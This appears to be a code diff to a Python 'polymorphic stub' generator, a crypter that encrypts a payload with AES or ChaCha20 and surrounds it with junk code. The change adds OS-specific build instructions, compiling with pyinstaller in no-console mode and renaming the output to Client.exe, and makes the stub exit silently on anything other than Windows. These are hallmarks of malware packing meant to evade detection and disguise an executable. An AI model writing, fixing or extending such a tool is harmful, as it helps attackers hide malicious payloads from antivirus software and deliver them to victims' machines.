@@ -12,6 +12,7 @@ import marshal
 import hashlib
 import binascii
 import base64
+import platform
 from Crypto.Cipher import AES, ChaCha20
 from Crypto.Util.Padding import pad, unpad
 
@@ -84,7 +85,14 @@ def encrypt_payload(payload_path, output_stub_path):
         ))
     
     print(f"[✅] Polymorphic stub generated: {output_stub_path}")
-    print("[🔧] Compile with: pyinstaller --onefile --noconsole --clean stub.py")
+    
+    # Provide correct compilation command based on OS
+    if platform.system() == "Windows":
+        print("[🔧] Compile with: pyinstaller --onefile --noconsole --clean stub.py")
+        print("[🔧] Then rename dist\\stub.exe to Client.exe")
+    else:
+        print("[🔧] Compile with: pyinstaller --onefile --noconsole --clean stub.py")
+        print("[🔧] Then rename dist/stub to Client.exe")
 
 # ========================
 # POLYMORPHIC CODE ENGINE (FIXED)
@@ -529,6 +537,10 @@ import cpuinfo
 from Crypto.Cipher import AES, ChaCha20
 from Crypto.Util.Padding import unpad
 import zlib
+
+# Exit immediately if not on Windows
+if not sys.platform.startswith('win'):
+    sys.exit(0)
 
 # =====================
 # POLYMORPHIC JUNK CODE
